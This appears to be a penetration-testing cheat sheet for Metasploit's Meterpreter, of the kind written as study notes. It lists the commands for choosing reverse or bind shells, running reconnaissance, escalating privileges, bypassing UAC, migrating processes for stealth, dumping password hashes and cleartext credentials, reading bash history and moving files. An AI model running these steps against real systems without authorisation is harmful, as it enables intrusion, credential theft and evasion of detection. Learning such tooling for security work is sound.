---
description: >-
  short for Meta-Interpreter: Powerful shell runs on (x86, x64) Android, BSD,
  Java, Linux, PHP, Python & Windows. Able to gather info, Transfer files,
  install backdoors ...etc .
---

# Meterpreter

### List all Meterpreters:

```
search meterpreter
```

### Choose payload

```
set payload <your_meterpreter>
```

{% hint style="success" %}
Meterpreter can:

* bind\_tcp: Wait for commands on target machine. it runs a server on target waiting for conn from attacker.
* &#x20;reverse\_tcp: connect back to attacker. it performs a TCP conn to the attacker machine.&#x20;
{% endhint %}

#### To get the Meterpreter session you must run the exploit. (as shown in Metasploit)

```
exploit
```

## Sessions:

{% hint style="info" %}
**MSFConsole** can host multiple **Meterpreter** sessions.
{% endhint %}

### switch from Meterpreter session to the msf:

```
background
```

### list all the sessions in msf:

```
sessions -l
```

### resume a background session:

```
sessions -i <id>
```

## 🔍Recon with Meterpreter:

{% hint style="info" %}
Meterpreter, allow you to gather info on exploited machine and it's network. to retrieve:

* Info about Machine & OS.
* Network Config in use.
* Routing table of target.
* Target user info&#x20;
{% endhint %}

### System info:

```
sysinfo
```

### Print network config.:

```
ifconfig
```

### Get routing table&#x20;

```
route
```

### which user is running the process you exploited&#x20;

```
getuid
```

## Privilege Escalation:

### Run privilege escalation routine (if user is not privileged):

```
getsystem
```

> system is the highest privileges on windows machine.

{% hint style="danger" %}
in modern Windows OS he **User Account Control** (UAC) policy prevents privilege escalation. (fail when running getsystem).
{% endhint %}

### bypass UAC:

```
search bypassuac
use exploit/windows/local/bypassuac
set session <session_id_you_want_bypass_uac>
exploit
```

> Now you get a new session with UAC policy disabled.

### inside a Meterpreter session you can use the following to see your privileges:

```
run post/windosw/gather/win_privs
```

also read this to get privilege without tools:

[https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation](https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation)

## Remain Stealthy:

change the process name so it's no suspicious (inside Meterpreter session):

```
ps /          /to check runing process in target
ps -U SYSTEM //check for process with the same privilages (ex:SYSTEM)

migrate <process_ID>

getpid      //double check by getting the your-proc ID
```

## 🔑Dumping Password Database (hashes):

you can type hashdump inside a Meterpreter session another way is:

```
background 
use post/windows/gather/hashdump
set session <id>
exploit
```

better way dumbed in clear text:

```
migrate -N explorer.exe //migrate to process o have same admin right 
background
use post/windows/gather/credentials/windows_autologin
set SESSION <ID>
exploit
```

## Dumbing Victim .bash\_history

assuming you hacked a Unix system and now you have a meterpreter sessions and inside it:

```
background
use post/linux/gather/enum_users_history
set SESSION 1
run
```

## 🚶‍♂️Exploring the Victim System:

### navigation:

```
pwd      //print working dire
cd C:\\  //escape backslashes by doubling them.
ls       //list current dir
```

### Downloading & Uploading:

```
download '<output_location>' <Local_PC_path>
upload download '<local_path>' <target_ecape_backslash>
```

## Running the OS Shell&#x20;

```
shell
bash -i //sometimes needed
mv backups /var/www/html/backups
```

## Help

every command have a help just add -h:

```
command -h
help       //to display all Meterpreter commands
```

##
